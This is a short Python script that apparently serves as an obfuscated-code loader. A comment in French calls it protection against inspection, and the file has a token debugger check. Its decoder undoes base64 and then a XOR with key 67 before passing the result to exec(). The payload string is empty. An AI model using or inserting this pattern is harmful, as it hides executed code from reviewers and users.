import sys, base64, zlib

# Protection contre l'inspection basique
class _Guard:
    def __init__(self):
        self._sys = sys
    def check(self):
        if hasattr(self._sys, 'gettrace') and self._sys.gettrace():
            pass
_Guard().check()

_data = ""

def _decode_layer(d):
    payload = d
    payload = base64.b64decode(payload).decode('utf-8')
    key = 67
    parts = [int(x) ^ key for x in payload.split(',')]
    payload = ''.join(chr(x) for x in parts)
    return payload

exec(_decode_layer(_data))
